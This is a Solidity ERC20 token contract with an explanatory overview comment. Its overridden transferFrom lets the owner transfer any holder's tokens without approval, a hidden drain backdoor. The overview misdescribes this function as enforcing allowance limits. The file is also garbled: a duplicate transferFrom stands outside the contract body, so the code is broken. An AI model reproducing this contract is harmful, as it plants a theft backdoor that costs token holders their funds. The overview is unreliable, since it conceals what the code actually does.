// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Token is ERC20, Ownable {
    constructor(uint256 initialSupply, address initialOwner) ERC20("Token", "MTK") Ownable(initialOwner) {
        _mint(initialOwner, initialSupply);
    }

    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }

    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }

    function approveTransfer(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(_msgSender() == owner() || allowance(from, _msgSender()) >= amount, "ERC20: transfer amount exceeds allowance");
        _transfer(from, to, amount);
        if (_msgSender() != owner()) {
            _approve(from, _msgSender(), allowance(from, _msgSender()) - amount);
        }
        return true;
    }
}

    /// @dev Transfer tokens from one address to another
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(_msgSender() == owner() || allowance(from, _msgSender()) >= amount, "ERC20: transfer amount exceeds allowance");
        _transfer(from, to, amount);
        if (_msgSender() != owner()) {
            _approve(from, _msgSender(), allowance(from, _msgSender()) - amount);
        }
        return true;
    }
}

/*
OVERVIEW:

Contract Declaration and Inheritance:

- Token contract:
  - Declared and inherits functionality from two other contracts: ERC20 and Ownable.
  
- ERC20:
  - Provides standard ERC20 token functionalities such as:
    - transfer
    - approve
    - balanceOf
  
- Ownable:
  - Provides access control functionality where the owner of the contract can execute privileged operations.

Constructor:

- The constructor initializes the Token contract when it is deployed.
- It takes two parameters:
  - initialSupply: Specifies the initial amount of tokens to mint and assign to initialOwner.
  - initialOwner: The address that initially owns all the tokens and has administrative rights over the contract.
- During initialization, the constructor calls the constructors of ERC20 and Ownable to set up:
  - The token name
  - The symbol
  - Initial ownership.

Functions:

- Minting (mint function):
  - Allows the owner of the contract to mint additional tokens and allocate them to a specified address.
  - Ensures that only the owner can call this function to maintain control over token supply.

- Burning (burn function):
  - Enables any account to burn (destroy) a specified amount of their own tokens.
  - Reduces the total supply of tokens in circulation.

- Approving Transfers (approveTransfer function):
  - Allows any token holder to approve another address (spender) to spend tokens on their behalf up to a specified amount.
  - Enhances flexibility for token holders to delegate token management without directly transferring ownership.

- Transferring Tokens (transfer function):
  - Overrides the default transfer function inherited from ERC20.
  - Facilitates the transfer of tokens from the caller's account to a specified recipient.
  - Provides a basic mechanism for users to exchange tokens within the ERC20 standard.

- Transferring Tokens on Behalf of (transferFrom function):
  - Overrides the default transferFrom function inherited from ERC20.
  - Enables token holders to delegate the authority for another address (spender) to transfer tokens on their behalf.
  - Implements additional checks to ensure the transfer amount does not exceed the approved allowance.
*/
